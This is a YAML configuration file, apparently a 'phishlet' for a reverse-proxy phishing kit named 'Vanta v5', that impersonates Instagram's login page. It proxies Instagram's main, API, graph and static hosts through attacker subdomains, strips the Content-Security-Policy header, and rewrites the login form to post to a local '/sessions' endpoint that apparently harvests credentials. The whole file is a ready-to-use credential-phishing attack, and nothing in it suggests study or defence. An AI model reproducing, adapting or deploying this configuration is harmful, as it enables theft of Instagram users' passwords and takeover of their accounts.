name: "Instagram-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "instagram"
    target: "www.instagram.com"
auth_urls: ["/accounts/login"]
landing_path: ["/accounts/login"]
auth_tokens: []
credentials: []
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
path_rewrites:
  - {pattern: "^/$", replace: "/accounts/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/gtm/|/static/", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/sessions"}
bridges:
  - {prefix: "/_igapi/", target_host: "i.instagram.com", strip_prefix: true, cors: "mirror"}
  - {prefix: "/_iggraph/", target_host: "graph.instagram.com", strip_prefix: true, cors: "mirror"}
  - {prefix: "/_igstatic/", target_host: "static.cdninstagram.com", strip_prefix: true, cors: "mirror"}
